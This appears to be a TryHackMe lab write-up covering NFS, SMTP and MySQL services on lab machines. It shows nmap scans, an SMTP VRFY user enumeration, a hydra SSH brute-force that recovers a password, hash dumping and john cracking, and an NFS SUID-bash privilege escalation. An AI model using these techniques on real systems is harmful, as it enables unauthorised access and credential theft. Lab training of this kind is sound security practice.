
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-1.png)

### NFS

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. 

```text

tarting Nmap 7.80 ( https://nmap.org ) at 2020-11-24 07:27 EST
Nmap scan report for 10.10.162.15
Host is up (0.072s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
111/tcp   open  rpcbind
2049/tcp  open  nfs
34083/tcp open  unknown
55991/tcp open  unknown
58905/tcp open  unknown
59485/tcp open  unknown
```

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-2.png)
I copied the id_rsa file to my computer as it coulcd come handy.

On NFS is enabled root squashing  and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. To escalate privilges:
- go to home directory of the cappucino user
- download the executable, which is an Ubuntu Server 18.04 bash executable. Change it's permissions to be executable and suid and also change the ownership to root.
- ssh into the machine and execute the binary

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-3.png)

### SMTP

I could explain this protocol, but i found this website which describe in more details what is SMTP and what does.

```text
# Nmap 7.80 scan initiated Tue Nov 24 05:34:08 2020 as: nmap -sS -T 4 -oN smtp_scan1.txt 10.10.2.43
Nmap scan report for 10.10.2.43
Host is up (0.062s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp

# Nmap done at Tue Nov 24 05:34:09 2020 -- 1 IP address (1 host up) scanned in 1.31 seconds
 ```
 I used metasploit to get more information about this service, but it could have bee done also manually as easy.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-4.png)

I used this module to enumerate the users.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-5.png)

From the  results, it seems it found the user administrator.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-6.png)

I bruteforced it's password, found it, then ssh'ed into the service and read the flag.

```text
hydra -l administrator -P /usr/share/wordlists/rockyou.txt  10.10.2.43 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-24 05:55:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.2.43:22/
[22][ssh] host: 10.10.2.43   login: administrator   password: alejandro
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-24 05:56:38
```
I also tried to do almost the same thing manually. The difference is in the users enumeration which i could have done it using a script and trying every username in the users file. Upon connecting i noticed the banner which states the server. I tried 2 usernames and took a good look at the difference between the server's response to a unexisting user and an existing one.

```text
telnet 10.10.2.43 25
Trying 10.10.2.43...
Connected to 10.10.2.43.
Escape character is '^]'.
220 polosmtp.home ESMTP Postfix (Ubuntu)
vfy admin
502 5.5.2 Error: command not recognized
vrfy admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
vrfy administrator
252 2.0.0 administrator
```

### MySQL

MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL)
```text
# Nmap 7.80 scan initiated Tue Nov 24 04:17:22 2020 as: nmap -sS -T4 -oN mysql_nmap.txt 10.10.148.57
Nmap scan report for 10.10.148.57
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3306/tcp open  mysql

# Nmap done at Tue Nov 24 04:17:24 2020 -- 1 IP address (1 host up) scanned in 1.91 seconds
```

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-7.png)

I set the password, rhosts and username, the run it.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-8.png)

I listed the databases.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-9.png)

Then exploited it.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-10.png)

I dumped all the hashes.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Network%20services%202/images/137-11.png)

```text
john --wordlist=/usr/share/wordlists/rockyou.txt mysql_hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
doggie           (carl)
1g 0:00:00:00 DONE (2020-11-24 04:37) 5.882g/s 9788p/s 9788c/s 9788C/s helpme..athena
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Manually i could have done:
1. mysql -h 10.10.148.57 -u root -p
2. use mysql;
3. select user, authentication_string from user;
